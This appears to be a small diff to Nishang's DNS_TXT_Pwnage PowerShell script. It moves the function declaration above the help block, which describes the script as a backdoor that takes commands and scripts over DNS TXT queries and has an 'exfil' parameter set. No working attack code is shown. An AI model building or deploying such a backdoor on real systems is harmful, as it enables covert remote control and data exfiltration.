@@ -1,4 +1,7 @@
 
+
+function DNS_TXT_Pwnage
+{
 <#
 .SYNOPSIS
 Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.
@@ -93,11 +96,6 @@ http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
 
-
-
-
-function DNS_TXT_Pwnage
-{
     [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
         [Parameter(Parametersetname="exfil")]
         [Switch]
